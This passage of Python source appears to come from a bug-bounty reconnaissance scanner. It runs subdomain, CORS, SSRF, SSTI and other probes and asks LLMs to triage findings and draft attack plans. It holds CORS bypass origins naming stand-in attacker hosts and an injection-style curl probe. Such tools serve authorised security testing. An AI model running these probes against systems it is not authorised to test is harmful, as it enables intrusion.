    url = f.get("url") or f.get("host","")
    ev  = (f.get("evidence") or f.get("snippet") or "")[:100]
    exp = f.get("exploit") or {}
    vlabel = VERDICT_LABEL.get(exp.get("verdict",""), "")
    # Show the "how to verify / exploit" steps in the terminal for anything worth
    # chasing (confirmed or needs-manual-proof). Skip the rejected 'no' verdicts.
    steps = exp.get("steps", []) if exp.get("verdict") in ("yes", "manual") else []
    fw = f.get("framework") or {}
    fw_line = ""
    if fw and (fw.get("mitre","—") != "—" or fw.get("owasp","—") != "—"):
        parts = [p for p in [fw.get("mitre"), fw.get("owasp"), fw.get("wstg")] if p and p != "—"]
        fw_line = " · ".join(parts)
    if HAS_RICH:
        console.print(f"  {em} [bold]{sev}[/bold] {t}")
        if url: console.print(f"     [cyan]{url}[/cyan]")
        if ev:  console.print(f"     [green]{ev}[/green]")
        if vlabel: console.print(f"     [magenta]{vlabel}[/magenta] — {exp.get('impact','')}")
        if fw_line: console.print(f"     [dim]🗺  {fw_line}[/dim]")
        for s in steps[:4]:
            console.print(f"     [yellow]↳[/yellow] {s}")
    else:
        print(f"  {em} [{sev}] {t}")
        if url: print(f"     {url}")
        if ev:  print(f"     {ev}")
        if vlabel: print(f"     {vlabel} — {exp.get('impact','')}")
        if fw_line: print(f"     🗺  {fw_line}")
        for s in steps[:4]:
            print(f"     ↳ {s}")

# ══════════════════════════════════════════════════════════════════════════════
#  AI TRIAGE  (folded in from the former claude_hunter.py + artemis_triage.py)
#  Multi-provider 3-phase triage that runs directly on in-memory findings — no
#  fragile report re-parsing. Providers: Ollama (local/free), Groq, Anthropic.
# ══════════════════════════════════════════════════════════════════════════════
AI_TRIAGE_SYSTEM = (
    "You are a senior bug-bounty triage analyst. Be concise, specific and decisive. "
    "Judge exploitability and real-world impact, not theory. Output ONLY the JSON asked for."
)

def _ai_http_json(url: str, payload: dict, headers: dict, timeout: int = 60):
    import urllib.request as ur
    req = ur.Request(url, data=json.dumps(payload).encode(),
                     headers={"Content-Type": "application/json", **headers}, method="POST")
    with ur.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read())

def ai_ask(prompt: str, provider: str, model: str, system: str = "") -> str:
    try:
        if provider == "ollama":
            msgs = ([{"role":"system","content":system}] if system else []) + [{"role":"user","content":prompt}]
            data = _ai_http_json("http://localhost:11434/api/chat",
                                 {"model":model,"messages":msgs,"stream":False,
                                  "options":{"temperature":0.2,"num_predict":2000}}, {}, 120)
            return data.get("message",{}).get("content","")
        if provider == "groq":
            msgs = ([{"role":"system","content":system}] if system else []) + [{"role":"user","content":prompt}]
            data = _ai_http_json("https://api.groq.com/openai/v1/chat/completions",
                                 {"model":model,"messages":msgs,"max_tokens":2000,"temperature":0.2},
                                 {"Authorization": f"Bearer {os.environ.get('GROQ_API_KEY','')}"}, 60)
            return data["choices"][0]["message"]["content"]
        if provider == "anthropic":
            import anthropic
            client = anthropic.Anthropic()
            msg = client.messages.create(model=model, max_tokens=2000, system=system,
                                         messages=[{"role":"user","content":prompt}])
            return msg.content[0].text
    except Exception as e:
        return f"[ERROR] {provider}: {e}"
    return "[ERROR] no provider"

def ai_detect_provider() -> tuple:
    """Auto-pick: local Ollama → Groq → Anthropic. Returns (provider, model)."""
    try:
        import urllib.request as ur
        with ur.urlopen(ur.Request("http://localhost:11434/api/tags"), timeout=3) as r:
            models = [m["name"] for m in json.loads(r.read()).get("models",[])]
            if models:
                for pref in ["llama3.2","llama3.1","qwen2.5","mistral","gemma2"]:
                    for m in models:
                        if pref in m.lower(): return "ollama", m
                return "ollama", models[0]
    except Exception:
        pass
    if os.environ.get("GROQ_API_KEY"):      return "groq", "llama-3.3-70b-versatile"
    if os.environ.get("ANTHROPIC_API_KEY"): return "anthropic", os.environ.get("ANTHROPIC_MODEL","claude-sonnet-5-5")
    return "none", ""

def ai_parse_json(text: str) -> dict:
    text = re.sub(r'^```(?:json)?\s*\n?', '', text.strip())
    text = re.sub(r'\n?```\s*$', '', text.strip())
    try:
        return json.loads(text)
    except Exception:
        pass
    start = text.find('{')
    if start != -1:
        depth = 0
        for i, ch in enumerate(text[start:], start):
            if ch == '{': depth += 1
            elif ch == '}':
                depth -= 1
                if depth == 0:
                    try: return json.loads(text[start:i+1])
                    except Exception: break
    return {"_raw": text[:400]}

def ai_triage_finding(f: dict, provider: str, model: str) -> dict:
    """3-phase triage (review → validation → severity) on one finding dict."""
    title = f.get("title") or f.get("detail") or "Finding"
    base = (f"Title: {title}\nURL: {f.get('url') or f.get('host','')}\n"
            f"Severity(reported): {f.get('severity','?')}\nCategory: {f.get('category','?')}\n"
            f"Evidence: {(f.get('evidence') or f.get('snippet') or f.get('detail',''))[:400]}")

    p1 = ai_parse_json(ai_ask(
        f"""## PHASE 1 — INITIAL REVIEW\n{base}\n
Decide if this is worth validating. Is the evidence specific? Real vuln or false positive? Realistic impact?
Return JSON: {{"decision":"PROCEED|REJECT","reasoning":"2-3 sentences","risk":"what an attacker gains","validation_plan":"how to confirm"}}""",
        provider, model, AI_TRIAGE_SYSTEM))

    out = {"title": title, "url": f.get("url") or f.get("host",""),
           "category": f.get("category",""), "reported_severity": f.get("severity","?"),
           "decision": p1.get("decision","?"), "reasoning": p1.get("reasoning","")}

    if str(p1.get("decision","")).upper() == "REJECT":
        out["decision"] = "REJECTED"
        return out

    p3 = ai_parse_json(ai_ask(
        f"""## PHASE 2+3 — VALIDATION & SEVERITY\n{base}\nValidation plan: {p1.get('validation_plan','')}\n
Write copy-paste reproduction and assess final severity using CVSS 3.1.
Return JSON: {{"reproduced":true|false,"confidence":0-100,"repro_steps":["..."],"commands":["curl ..."],
"severity":"Critical|High|Medium|Low","cvss_score":0.0-10.0,"cvss_vector":"AV:.../...",
"report_title":"...","summary":"2-3 sentences","business_impact":"...","remediation":"...","bounty_estimate":"$X-$Y"}}""",
        provider, model, AI_TRIAGE_SYSTEM))

    try: conf = int(str(p3.get("confidence",0)).replace("%",""))
    except Exception: conf = 0
    out["decision"] = "CONFIRMED" if (p3.get("reproduced") or conf >= 40) else "LIKELY_FP"
    out["confidence"] = conf
    out["final_severity"] = p3.get("severity", f.get("severity","?"))
    try: out["cvss"] = float(str(p3.get("cvss_score",0)).split()[0])
    except Exception: out["cvss"] = 0.0
    for k in ("cvss_vector","report_title","summary","business_impact","remediation","bounty_estimate"):
        out[k] = p3.get(k,"")
    out["repro_steps"] = p3.get("repro_steps",[]) or []
    out["commands"] = p3.get("commands",[]) or []
    return out

def run_ai_triage(findings: list, provider: str, model: str, min_sev: str = "Medium") -> list:
    order = {"Critical":0,"High":1,"Medium":2,"Low":3,"Info":4}
    cutoff = order.get(min_sev, 2)
    queue = [f for f in findings if order.get(f.get("severity","Info"),4) <= cutoff]
    results = []
    for i, f in enumerate(queue, 1):
        console.print(f"  [{i}/{len(queue)}] triaging: {(f.get('title') or 'finding')[:60]}"
                      if not HAS_RICH else f"  [dim][{i}/{len(queue)}][/dim] {(f.get('title') or 'finding')[:60]}")
        results.append(ai_triage_finding(f, provider, model))
    return results

def ai_attack_plan(domain: str, findings: list, provider: str, model: str) -> str:
    top = sorted(findings, key=lambda x: SEV_ORDER.get(x.get("severity","Info"),4))[:25]
    summary = "\n".join(f"- [{f.get('severity')}] {f.get('title') or f.get('detail','')} ({f.get('url','')})" for f in top)
    return ai_ask(
        f"""Target: {domain}\nRecon findings (top {len(top)}):\n{summary}\n
Produce a prioritised attack plan: top 3 chains to pursue first (with concrete steps + tools),
what to look for in responses, and low/medium/high effort per chain. Under 450 words.""",
        provider, model, "You are a senior penetration tester. Be practical and specific.")

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description=f"bounty_recon.py v{VERSION} — Bug Bounty Passive Recon & Misconfiguration Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    ap.add_argument("-t","--target",          required=True, help="Target domain (e.g. example.com)")
    ap.add_argument("--url",                  help="Override base URL for scanning")
    ap.add_argument("--cors-origin",          action="append", default=[], dest="cors_origins")
    ap.add_argument("--nuclei",               action="store_true", help="Run nuclei")
    ap.add_argument("--js",                   action="store_true", help="Scan JS files for secrets & endpoints")
    ap.add_argument("--playwright",           action="store_true", help="Headless Playwright crawl")
    ap.add_argument("--s3",                   action="store_true", help="Check S3/GCS bucket permutations")
    ap.add_argument("--graphql",              action="store_true", help="Run GraphQL full audit")
    ap.add_argument("--waf",                  action="store_true", help="Fingerprint WAF vendor")
    ap.add_argument("--ssrf",                 action="store_true", help="Detect SSRF parameter names")
    ap.add_argument("--ssrf-callback",        default="", dest="ssrf_callback", help="OOB callback URL for active SSRF probe")
    ap.add_argument("--open-redirect",        action="store_true", dest="open_redirect", help="Detect open redirect params")
    ap.add_argument("--ssti",                 action="store_true", help="SSTI canary injection test")
    ap.add_argument("--proto-pollution",      action="store_true", dest="proto_pollution", help="Prototype pollution detection")
    ap.add_argument("--race",                 action="store_true", help="Race condition endpoint hints")
    ap.add_argument("--idor",                 action="store_true", help="IDOR candidate detection")
    ap.add_argument("--lfi-xxe",              action="store_true", dest="lfi_xxe", help="LFI/XXE surface detection")
    ap.add_argument("--wayback",              action="store_true", help="Fetch Wayback Machine parameterised URLs")
    ap.add_argument("--param-mine",           action="store_true", dest="param_mine", help="Mine unique parameter names from all discovered URLs")
    ap.add_argument("--idn",                  action="store_true", help="Check IDN homoglyph domains")
    ap.add_argument("--cve",                  action="store_true", help="CVE fingerprint detection")
    ap.add_argument("--cache-poison",         action="store_true", dest="cache_poison", help="Host-override cache-poisoning probe")
    ap.add_argument("--lib-versions",         action="store_true", dest="lib_versions", help="Detect outdated JS libraries (retire.js-lite)")
    ap.add_argument("--full",                 action="store_true", help="Enable ALL optional modules")
    # ── v4.0: profiles, concurrency, safety gate, output ──────────────────────
    ap.add_argument("--profile",              choices=["passive","safe","aggressive"], default=None,
                    help="passive=read-only recon; safe=+non-destructive probes; aggressive=+injection/active (implies --active)")
    ap.add_argument("--active",               action="store_true",
                    help="Allow intrusive out-of-band probes (e.g. active SSRF callback dispatch). Authorised targets only.")
    ap.add_argument("--threads",              type=int, default=20, help="Concurrent workers (default 20)")
    ap.add_argument("--rate",                 type=float, default=0.0, help="Global requests/sec cap (0 = unlimited)")
    ap.add_argument("--retries",              type=int, default=2, help="Retry attempts on transient network errors")
    ap.add_argument("--timeout",              type=int, default=TIMEOUT, help=f"Per-request timeout seconds (default {TIMEOUT})")
    ap.add_argument("--verbose",              action="store_true", help="Show per-host errors during concurrent phases")
    ap.add_argument("--html",                 action="store_true", help="Also write a self-contained HTML report")
    ap.add_argument("--no-exploit",           action="store_true", dest="no_exploit",
                    help="Do not attach exploitation plans / generate PoC files")
    # ── v4.0: AI triage (folds in the old claude_hunter.py / artemis_triage.py) ─
    ap.add_argument("--ai-triage",            action="store_true", dest="ai_triage",
                    help="Run 3-phase AI triage on findings (auto-detects Ollama/Groq/Anthropic)")
    ap.add_argument("--ai-plan",              action="store_true", dest="ai_plan",
                    help="Generate an AI prioritised attack plan from the findings")
    ap.add_argument("--ai-provider",          default="auto", choices=["auto","ollama","groq","anthropic"],
                    help="AI provider for triage/plan (default auto)")
    ap.add_argument("--ai-model",             default="", help="Override AI model name")
    ap.add_argument("--ai-min-sev",           default="Medium", dest="ai_min_sev",
                    choices=["Critical","High","Medium","Low","Info"],
                    help="Only AI-triage findings at or above this severity (default Medium)")
    ap.add_argument("--github-repo",          help="GitHub repo (owner/repo)")
    ap.add_argument("--github-token",         default=os.environ.get("GITHUB_TOKEN",""))
    ap.add_argument("--securitytrails-key",   default=os.environ.get("SECURITYTRAILS_API_KEY",""))
    ap.add_argument("--no-subdomains",        action="store_true")
    ap.add_argument("--out",                  default="")
    ap.add_argument("--out-dir",              default=".")
    ap.add_argument("--json",                 action="store_true")
    ap.add_argument("--import-dalfox",        default="", dest="import_dalfox")
    ap.add_argument("--import-nuclei",        default="", dest="import_nuclei")
    ap.add_argument("--min-confidence",       type=float, default=0.8, dest="min_confidence")
    args = ap.parse_args()

    # ── Scan profiles: convenience bundles of module flags + safety gate ──────
    if args.profile == "passive":
        # Read-only recon only: no injection, no active probes.
        for m in ["js","s3","graphql","waf","wayback","param_mine","cve","lib_versions"]:
            setattr(args, m, True)
    elif args.profile == "safe":
        for m in ["js","s3","graphql","waf","wayback","param_mine","cve","lib_versions",
                  "open_redirect","idor","lfi_xxe","race","cache_poison","nuclei"]:
            setattr(args, m, True)
    elif args.profile == "aggressive":
        args.full = True
        args.active = True

    # --full enables every module
    if args.full:
        args.nuclei = args.js = args.s3 = args.graphql = args.waf = True
        args.ssrf = args.open_redirect = args.ssti = args.proto_pollution = True
        args.race = args.idor = args.lfi_xxe = args.wayback = args.param_mine = True
        args.cve = args.idn = args.cache_poison = args.lib_versions = True

    # Configure the shared HTTP layer (connection pool, rate limit, retries, gate)
    configure_http(threads=args.threads, rate=args.rate, retries=args.retries,
                   timeout=args.timeout, active=args.active, verbose=args.verbose)

    domain   = args.target.replace("https://","").replace("http://","").split("/")[0]
    base_url = args.url or f"https://{domain}"
    out_dir  = Path(args.out_dir); out_dir.mkdir(parents=True, exist_ok=True)
    stem     = args.out or f"{domain.replace('.','_')}_{datetime.datetime.now(datetime.timezone.utc).strftime('%Y%m%d_%H%M')}"
    md_path  = out_dir / f"{stem}.md"
    jp       = out_dir / f"{stem}.json"

    result = ScanResult(target=domain)
    all_findings, all_passed = [], []

    # Injection modules are active-by-nature; warn so scope/authorisation is explicit.
    injection_on = [m for m in ["ssti","open_redirect","proto_pollution","cache_poison","waf"]
                    if getattr(args, m, False)] + (["ssrf-oob"] if (args.ssrf_callback and args.active) else [])
    prof = args.profile or ("full" if args.full else "core")
    if HAS_RICH:
        mods_on = [m for m in ["nuclei","js","s3","graphql","waf","ssrf","ssti","open_redirect",
                               "proto_pollution","cache_poison","lib_versions","idor","race",
                               "lfi_xxe","cve","idn","wayback","param_mine"] if getattr(args,m,False)]
        warn = (f"\n[bold yellow]⚠ Active/injection modules enabled:[/bold yellow] {', '.join(injection_on)}"
                if injection_on else "")
        console.print(Panel(
            f"[bold cyan]bounty_recon.py[/bold cyan] v{VERSION}  (profile: {prof})\n"
            f"Target   : [bold]{domain}[/bold]\n"
            f"Base URL : {base_url}\n"
            f"Threads  : {HTTP_CFG['threads']}   Rate: {HTTP_CFG['rate'] or 'unlimited'} req/s   Retries: {HTTP_CFG['retries']}\n"
            f"Modules  : {', '.join(mods_on) if mods_on else 'core only'}"
            f"{warn}",
            title=f"🔍 Bug Bounty Recon v{VERSION} — authorised targets only"))
    else:
        print(f"\n{'='*55}\nbounty_recon.py v{VERSION} | {domain} | profile={prof}\n{'='*55}")
        if injection_on:
            print(f"⚠ Active/injection modules enabled: {', '.join(injection_on)} — authorised targets only")

    # 1. Subdomains
    if not args.no_subdomains:
        console.print("\n[bold]1. Subdomain Enumeration[/bold]" if HAS_RICH else "\n1. Subdomain Enumeration")
        result.subdomains = enum_subdomains(domain, args.securitytrails_key)
    else:
        result.subdomains = [domain]

    # 2. DNS + takeover
    console.print("\n[bold]2. DNS + Takeover + IDN[/bold]" if HAS_RICH else "\n2. DNS")
    dns_records = resolve_dns(result.subdomains[:40])
    result.dns_records = dns_records
    for host, rec in list(dns_records.items())[:10]:
        s = "✓" if rec["live"] else "✗"
        console.print(f"  {s} {host} A={rec['A'][:2]}")
        if rec["CNAME"]:
            to = check_dns_takeover(host, rec["CNAME"])
            if to:
                all_findings.append({"severity":"Critical","category":"dns-takeover","title":f"DNS takeover — {to['service']}","url":f"https://{host}","evidence":f"CNAME {to['cname']} → unclaimed {to['service']}","command":to["command"],"remediation":"Claim service or remove dangling CNAME"})
    for df in audit_dns_security(domain):
        all_findings.append(df)

    if args.idn:
        console.print("  → IDN homoglyph check")
        for idn_f in check_idn_homoglyphs(domain):
            all_findings.append(idn_f)

    # 3. Live hosts + tech
    console.print("\n[bold]3. Live Hosts + Tech Fingerprint[/bold]" if HAS_RICH else "\n3. Live Hosts")
    candidate = [h for h,r in dns_records.items() if r["live"]] or [domain]
    live = check_live(candidate[:20])
    result.live_hosts = live
    console.print(f"  {len(live)} live host(s)")
    for lh in live:
        h_resp, html_body = {}, ""
        try:
            _, h_resp, raw_b = http_get(lh["url"], timeout=6)
            html_body = raw_b.decode("utf-8","replace")
        except: pass
        techs = deep_fingerprint_tech(lh["url"], h_resp, html_body)
        if techs: result.technologies[lh["host"]] = techs

    scan_urls = list({h["url"] for h in live}) or [base_url]
    primary   = args.url or scan_urls[0]

    # 4. WAF fingerprinting
    if args.waf:
        console.print("\n[bold]4. WAF Fingerprinting[/bold]" if HAS_RICH else "\n4. WAF")
        for url in scan_urls[:3]:
            host = urlparse(url).netloc
            waf = fingerprint_waf(url)
            result.waf_detected[host] = waf
            if waf["vendor"]:
                console.print(f"  🛡  {host}: {waf['vendor']} (confidence: {waf['confidence']})")
                all_findings.append({"severity":"Info","category":"waf","title":f"WAF detected: {waf['vendor']}","url":url,"evidence":f"Vendor: {waf['vendor']} | Confidence: {waf['confidence']}","command":f'curl -si "{url}?id=1\\x27OR\\x271=1"',"remediation":"WAF present — use bypass techniques listed in report"})

    # 5. Endpoint sweep
    console.print("\n[bold]5. Sensitive Endpoint Sweep[/bold]" if HAS_RICH else "\n5. Endpoints")
    for url in scan_urls[:5]:
        ep_f, ep_p = sweep_endpoints(url)
        for f in ep_f:
            sev = endpoint_severity(f["url"])
            leaf = f["url"].split("/")[-1] or "(root)"
            label = "Reachable endpoint" if sev == "Info" else "Sensitive endpoint"
            rem = ("Public file — informational only; no action usually needed."
                   if sev == "Info" else "Restrict to internal, require auth, or remove from webroot.")
            all_findings.append({"severity":sev,"category":"exposure",
                "title":f"{label}: {leaf}","url":f["url"],"command":f["command"],
                "evidence":f"HTTP 200 | {f['content_type']} | {f['snippet'][:100]}","remediation":rem})
        all_passed.extend(ep_p)

    # 6. Security headers + cookies
    console.print("\n[bold]6. Security Headers & Cookie Audit[/bold]" if HAS_RICH else "\n6. Headers + Cookies")
    for url in scan_urls[:5]:
        hf, hp = check_headers(url)
        # Consolidate all *missing* security headers for this host into ONE finding
        # (a triager does not want 6-9 separate Low rows per host). Specific CSP
        # directive issues and server-version leaks stay as their own findings.
        missing = [f for f in hf if f["header"] in REQUIRED_HEADERS]
        other   = [f for f in hf if f["header"] not in REQUIRED_HEADERS]
        if missing:
            names = [f["header"] for f in missing]
            grp_sev = "Medium" if any(f["severity"] == "Medium" for f in missing) else "Low"
            all_findings.append({"severity":grp_sev,"category":"headers",
                "title":f"Missing security headers ({len(names)})","url":url,
                "command":f'curl -sI "{url}"',
                "evidence":"Absent: " + ", ".join(names),
                "remediation":"Add the headers at the edge/CDN. Note: on most bug-bounty programs "
                              "missing headers are informational and not independently rewarded."})
        for f in other:
            all_findings.append({"severity":f["severity"],"category":"headers",
                "title":f"Header: {f['header']}","url":f.get("url",url),
                "command":f.get("command",""),"evidence":f.get("evidence",""),
                "remediation":f.get("remediation","")})
        all_passed.extend(hp)
        try:
            _, resp_hdrs, _ = http_get(url, timeout=8)
            sc = resp_hdrs.get("set-cookie","")
            if sc:
                for s in sc.splitlines():
                    c_name = s.split("=")[0].strip() if "=" in s else "unknown"
                    c_val  = s.split("=")[1].split(";")[0].strip() if "=" in s else ""
                    for cf in audit_cookie(c_name, c_val, s, url): all_findings.append(cf)
        except Exception: pass

    # 7. TLS
    console.print("\n[bold]7. TLS Check[/bold]" if HAS_RICH else "\n7. TLS")
    tls_hosts = list({u.split("://")[1].split("/")[0] for u in scan_urls if "https" in u}) or [domain]
    for host in tls_hosts[:5]:
        tf, tp = check_tls(host)
        for f in tf: all_findings.append({"severity":f["severity"],"category":"tls","title":f"TLS: {f['detail']}","url":f"https://{f['host']}","command":f.get("command",""),"evidence":f["detail"],"remediation":f.get("remediation","")})
        all_passed.extend(tp)

    # 8. CORS
    console.print("\n[bold]8. CORS Check[/bold]" if HAS_RICH else "\n8. CORS")
    sub_origins = [f"https://{s}" for s in result.subdomains[:5]]
    # CORS bypass matrix: arbitrary origin, null, trusted-prefix/suffix tricks,
    # and a bare sibling subdomain — the common reflected-origin weaknesses.
    bypass_origins = [
        "https://evil.example.com", "null",
        f"https://attacker.{domain}",
        f"https://{domain}.evil.example.com",   # suffix-match bypass
        f"https://evil{domain}",                # prefix/substring bypass
        f"https://{domain}.attacker.com",
    ]
    test_origins = list(set(args.cors_origins + sub_origins + bypass_origins))
    for curl in [primary+p for p in ["/api/v1/health","/api/health",""]][:3]:
        for cf in check_cors(curl, test_origins[:8]):
            all_findings.append({"severity":cf["severity"],"category":"cors","title":f"CORS: {cf['origin']}","url":curl,"command":cf["command"],"evidence":cf["evidence"],"remediation":cf["remediation"]})

    # 9. JWKS / source maps
    console.print("\n[bold]9. Exposure Check[/bold]" if HAS_RICH else "\n9. Exposures")
    for url in scan_urls[:5]:
        for ef in check_exposures(url):
            all_findings.append({"severity":ef["severity"],"category":"exposure","title":ef["title"],"url":ef["url"],"command":ef["command"],"evidence":f"{ef.get('content_type','')} | {ef.get('snippet','')}","remediation":ef["remediation"]})

    # 10. GraphQL
    if args.graphql:
        console.print("\n[bold]10. GraphQL Audit[/bold]" if HAS_RICH else "\n10. GraphQL")
        for gf in audit_graphql(primary): all_findings.append(gf)

    # 11. SSRF
    if args.ssrf or args.ssrf_callback:
        console.print("\n[bold]11. SSRF Detection[/bold]" if HAS_RICH else "\n11. SSRF")
        for url in scan_urls[:3]:
            for sf in detect_ssrf_params(url, args.ssrf_callback): all_findings.append(sf)

    # 12. Open Redirect
    if args.open_redirect:
        console.print("\n[bold]12. Open Redirect Detection[/bold]" if HAS_RICH else "\n12. Open Redirect")
        for url in scan_urls[:3]:
            for rf in detect_open_redirects(url): all_findings.append(rf)

    # 13. SSTI
    if args.ssti:
        console.print("\n[bold]13. SSTI Canary[/bold]" if HAS_RICH else "\n13. SSTI")
        for url in scan_urls[:3]:
            for sf in detect_ssti(url): all_findings.append(sf)

    # 14. Prototype Pollution
    if args.proto_pollution:
        console.print("\n[bold]14. Prototype Pollution[/bold]" if HAS_RICH else "\n14. Proto Pollution")
        for url in scan_urls[:3]:
            for pf in detect_prototype_pollution(url): all_findings.append(pf)

    # 15. Race Conditions
    if args.race:
        console.print("\n[bold]15. Race Condition Hints[/bold]" if HAS_RICH else "\n15. Race Conditions")
        for url in scan_urls[:3]:
            for rf in detect_race_candidates(url): all_findings.append(rf)

    # 16. IDOR candidates
    if args.idor:
        console.print("\n[bold]16. IDOR Candidates[/bold]" if HAS_RICH else "\n16. IDOR")
        for url in scan_urls[:3]:
            for idf in detect_idor_candidates(url): all_findings.append(idf)

    # 17. LFI / XXE surface
    if args.lfi_xxe:
        console.print("\n[bold]17. LFI & XXE Surface[/bold]" if HAS_RICH else "\n17. LFI/XXE")
        for url in scan_urls[:3]:
            for lf in detect_lfi_xxe_surface(url): all_findings.append(lf)

    # 17b. Cache poisoning (Host-override reflection)
    if args.cache_poison:
        console.print("\n[bold]17b. Cache Poisoning Probe[/bold]" if HAS_RICH else "\n17b. Cache Poisoning")
        for url in scan_urls[:3]:
            for cf in detect_cache_poisoning(url): all_findings.append(cf)

    # 17c. Outdated front-end libraries (retire.js-lite)
    if args.lib_versions:
        console.print("\n[bold]17c. Outdated JS Libraries[/bold]" if HAS_RICH else "\n17c. Outdated Libs")
        for url in scan_urls[:3]:
            for lf in detect_js_lib_versions(url): all_findings.append(lf)

    # 18. JS secrets + endpoints
    all_endpoints, all_routes = set(), set()
    if args.js:
        console.print("\n[bold]18. JS Secrets & Endpoints[/bold]" if HAS_RICH else "\n18. JS Secrets")
        js_urls, nxt_routes = collect_js_urls(primary)
        all_routes.update(nxt_routes)
        all_oauth = set()
        for ju in js_urls[:35]:
            sec_list, ep_list = scan_js_secrets(ju)
            all_endpoints.update(ep_list)
            try:
                _, _, js_body = http_get(ju, timeout=8)
                all_oauth.update(extract_oauth_and_redirects(js_body.decode("utf-8","replace")))
            except Exception: pass
            for sf in sec_list:
                all_findings.append({"severity":sf["severity"],"category":"js-secrets","title":f"Secret in JS: {sf.get('type',sf.get('detail',''))}","url":sf["url"],"command":sf.get("command",""),"evidence":f"{sf.get('detail','')} | Sample: {sf.get('sample','')}","remediation":sf.get("remediation","")})
        if all_oauth: result.oauth_params = sorted(list(all_oauth))

    # 19. Wayback + param mining
    if args.wayback or args.param_mine:
        console.print("\n[bold]19. Wayback Machine + Param Mining[/bold]" if HAS_RICH else "\n19. Wayback")
        wb_urls = fetch_wayback_params(domain)
        console.print(f"  Found {len(wb_urls)} historical parameterised URL(s)")
        all_endpoints.update(wb_urls[:200])
        if args.param_mine:
            live_param_urls = [lh["url"] for lh in live]
            all_params = mine_parameters(wb_urls + live_param_urls)
            result.parameters = all_params
            console.print(f"  Mined {len(all_params)} unique parameter name(s)")

    result.routes    = sorted(list(all_routes))
    result.endpoints = sorted(list(all_endpoints))

    # 20. S3
    if args.s3:
        console.print("\n[bold]20. Cloud Storage Check[/bold]" if HAS_RICH else "\n20. Cloud Storage")
        for sf in check_s3_buckets(domain):
            all_findings.append({"severity":sf["severity"],"category":"s3","title":f"Cloud storage: {sf['detail']}","url":f"https://{sf['bucket']}.s3.amazonaws.com","command":sf.get("command",""),"evidence":sf.get("snippet",""),"remediation":sf.get("remediation","")})

    # 21. GitHub
    if args.github_repo and args.github_token:
        console.print("\n[bold]21. GitHub Recon[/bold]" if HAS_RICH else "\n21. GitHub")
        import_findings = []
        headers = {"Authorization":f"token {args.github_token}","Accept":"application/vnd.github.v3+json"}
        for pat in ["password","secret","api_key","apikey","token"][:5]:
            try:
                st, _, b = http_get(f"https://api.github.com/search/code?q={pat}+repo:{args.github_repo}", headers=headers, timeout=10)
                if st == 200:
                    data = json.loads(b); total = data.get("total_count",0)
                    if total > 0:
                        all_findings.append({"severity":"High","category":"github","title":f"GitHub: {total} matches for '{pat}' in {args.github_repo}","url":f"https://github.com/{args.github_repo}","command":f"gh search code '{pat}' --repo {args.github_repo}","evidence":f"{total} matches found","remediation":"Rotate secret; use GitHub secret scanning"})
            except Exception: pass

    # 22. nuclei
    if args.nuclei:
        console.print("\n[bold]22. nuclei Scan[/bold]" if HAS_RICH else "\n22. nuclei")
        for url in scan_urls[:3]:
            for n in run_nuclei(url, out_dir):
                if "error" in n: all_passed.append(f"nuclei: {n['error']}")
                else: all_findings.append(n)

    # 23. CVE fingerprints
    if args.cve:
        console.print("\n[bold]23. CVE Fingerprints[/bold]" if HAS_RICH else "\n23. CVE")
        for url in scan_urls[:5]:
            for cf in check_cve_fingerprints(url): all_findings.append(cf)

    # 24. Import Dalfox
    if args.import_dalfox:
        p = Path(args.import_dalfox)
        if p.exists():
            df = parse_dalfox_output(p.read_text(encoding="utf-8",errors="replace"), args.min_confidence)
            all_findings.extend(df)
            console.print(f"  Imported {len(df)} Dalfox finding(s)")

    # 25. Import nuclei JSONL
    if args.import_nuclei:
        p = Path(args.import_nuclei)
        if p.exists():
            nf = parse_nuclei_jsonl(p.read_text(encoding="utf-8",errors="replace"))
            all_findings.extend(nf)
            console.print(f"  Imported {len(nf)} nuclei finding(s)")

    # Finalise
    all_findings = dedup_findings(all_findings)
    result.findings = all_findings
    result.passed   = all_passed
    # Attach exploitation plans + write PoC files (the whole point: make it reportable)
    if not args.no_exploit:
        attach_exploitation(result, domain, out_dir)
    result.summary  = {
        "total":    len(all_findings),
        "critical": sum(1 for f in all_findings if f.get("severity")=="Critical"),
        "high":     sum(1 for f in all_findings if f.get("severity")=="High"),
        "medium":   sum(1 for f in all_findings if f.get("severity")=="Medium"),
        "low":      sum(1 for f in all_findings if f.get("severity")=="Low"),
        "passed":   len(all_passed),
    }

    # Print
    if HAS_RICH: console.rule("[bold red]FINDINGS")
    else: print(f"\n{'='*55} FINDINGS")
    for f in sorted(all_findings, key=lambda x: SEV_ORDER.get(x.get("severity","Info"),4)):
        print_finding(f)

    # ASCII chart
    print_ascii_chart(all_findings)

    # ── AI triage / attack plan (optional) ───────────────────────────────────
    if args.ai_triage or args.ai_plan:
        if args.ai_provider == "auto":
            provider, model = ai_detect_provider()
        else:
            provider = args.ai_provider
            model = args.ai_model or {"ollama":"llama3.2","groq":"llama-3.3-70b-versatile",
                                      "anthropic":os.environ.get("ANTHROPIC_MODEL","claude-sonnet-5-5")}.get(provider,"")
        if args.ai_model:
            model = args.ai_model
        if provider == "none":
            console.print("\n[yellow]⚠ AI triage requested but no provider found.[/yellow]\n"
                          "  Ollama: brew install ollama && ollama pull llama3.2 && ollama serve\n"
                          "  Groq:   export GROQ_API_KEY=gsk_...\n"
                          "  Claude: export ANTHROPIC_API_KEY=sk-ant-..." if HAS_RICH else
                          "\n⚠ AI triage requested but no provider found (set up Ollama/Groq/Anthropic).")
        else:
            if args.ai_triage:
                console.rule(f"[bold magenta]AI TRIAGE ({provider}/{model})") if HAS_RICH else print(f"\n=== AI TRIAGE ({provider}/{model})")
                result.ai_triage = run_ai_triage(all_findings, provider, model, args.ai_min_sev)
                confirmed = [t for t in result.ai_triage if t.get("decision") == "CONFIRMED"]
                console.print(f"  ✅ Confirmed: {len(confirmed)} | ❌ Rejected: "
                              f"{sum(1 for t in result.ai_triage if t.get('decision')=='REJECTED')} | "
                              f"⚠ Likely-FP: {sum(1 for t in result.ai_triage if t.get('decision')=='LIKELY_FP')}")
                for t in sorted(confirmed, key=lambda x: -x.get("cvss",0))[:5]:
                    console.print(f"    🎯 CVSS {t.get('cvss',0):.1f} — {t.get('report_title') or t.get('title','')[:60]}")
            if args.ai_plan:
                console.rule("[bold magenta]AI ATTACK PLAN") if HAS_RICH else print("\n=== AI ATTACK PLAN")
                result.ai_plan = ai_attack_plan(domain, all_findings, provider, model)
                console.print(result.ai_plan[:600])

    s = result.summary
